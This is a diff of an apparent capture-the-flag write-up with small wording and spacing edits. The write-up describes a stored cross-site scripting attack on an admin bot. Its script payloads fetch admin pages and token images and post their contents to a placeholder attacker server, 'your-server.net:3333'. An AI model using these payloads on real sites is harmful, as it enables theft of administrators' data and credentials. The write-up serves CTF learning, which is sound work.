@@ -12,7 +12,7 @@ $.post("http://your-server.net:3333");
 After some minutes, you should see a request from the admin. Check the `Referer` header and open this page:
 ```javascript
 <script type="text/javascript">
-$.get("/admin/comment/f1e92de5-cdbf-461c-9e9f-5be607cfb97d", function( data ) {
+$.get("/admin/comment/f1e92de5-cdbf-461c-9e9f-5be607cfb97d", function(data) {
   $.post("http://your-server.net:3333", data);
 });
 </script>
@@ -21,7 +21,7 @@ $.get("/admin/comment/f1e92de5-cdbf-461c-9e9f-5be607cfb97d", function( data ) {
 Nice, in the navigation there is a link to `/admin/token`! Let's open it:
 ```javascript
 <script type="text/javascript">
-$.get("/admin/token", function( data ) {
+$.get("/admin/token", function(data) {
   $.post("http://your-server.net:3333", data);
 });
 </script>
@@ -65,7 +65,7 @@ fetchBlob("admin/img/token.png?20151228", function(blob) {
 ```
 
 Unfortunately this didn't work. Either the admin (a bot of course) was down or it was because the "comment" is too long, so just minify the javascript.
-Then decode base64 and open the png file. Looks like a token!
+Then decode the base64 data and open the png file. Looks like a token!
 
 
 But it didn't work...
@@ -74,13 +74,13 @@ Next day we got a hint in the description: There are two parts of the token and 
 So let's recheck the HTML code of the admin page... and we find another link to `/admin/bugs`. Let's open it:
 ```javascript
 <script type="text/javascript">
-$.get("/admin/bugs", function( data ) {
+$.get("/admin/bugs", function(data) {
   $.post("http://your-server.net:3333", data);
 });
 </script>
 ```
 
-There is another image, let's request it:
+There is another image on this page, let's request it:
 ```javascript
 <script type="text/javascript">
 // http://www.henryalgus.com/reading-binary-files-using-jquery-ajax/
@@ -118,6 +118,6 @@ fetchBlob("admin/img/root_pw.png?20151228", function(blob) {
 ```
 (Don't forget to minify the javascript source)
 
-Same as before, decode the base64, then we have two tokens.
+Same as before, decode the base64 data, save as png and open the file in an image viewer. The token is the mysql password of the production environment.
 
-Concatenate it (first the mysql password of production, then the number-only token) and you're done.
+Concatenate it (first the mysql password, then the other number-only token) and you're done.
